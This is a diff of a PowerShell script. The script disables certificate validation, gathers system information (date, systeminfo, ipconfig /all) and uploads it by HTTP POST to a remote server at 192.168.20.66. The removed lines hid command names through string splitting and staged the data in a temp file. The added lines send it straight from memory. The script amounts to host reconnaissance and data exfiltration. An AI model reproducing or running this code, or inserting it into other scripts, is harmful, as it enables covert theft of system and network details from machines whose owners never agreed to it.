@@ -7,16 +7,16 @@ public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,
 "@
 [Net.ServicePointManager]::CertificatePolicy = New-Object T
 
-$h = "$env:T"+"EMP\rep"+"ort.txt"
-$z = ("https://"+"192.168.20.66"+"/upl"+"oad")
+$b = New-Object -TypeName System.Text.StringBuilder
+[void]$b.AppendLine("=D=")
+[void]$b.AppendLine((date | Out-String))
+[void]$b.AppendLine("`n=S=")
+[void]$b.AppendLine((systeminfo | Out-String))
+[void]$b.AppendLine("`n=I=")
+[void]$b.AppendLine((ipconfig /all | Out-String))
 
-"=D=" | Out-File $h -Encoding UTF8
-(&('da'+'te')) | Out-File $h -Append -Encoding UTF8
+$z = "https://192.168.20.66/upload"
+$utf8 = [System.Text.Encoding]::UTF8
+$bytes = $utf8.GetBytes($b.ToString())
 
-"`n=S=" | Out-File $h -Append -Encoding UTF8
-(&('syste'+'minfo')) | Out-File $h -Append -Encoding UTF8
-
-"`n=I=" | Out-File $h -Append -Encoding UTF8
-(&('ipco'+'nfig') '/all') | Out-File $h -Append -Encoding UTF8
-
-(&('Invoke-Rest'+'Method') -Uri $z -Method Post -InFile $h -ContentType "text/plain" -UseBasicParsing)
+Invoke-RestMethod -Uri $z -Method Post -Body $bytes -ContentType "text/plain" -UseBasicParsing
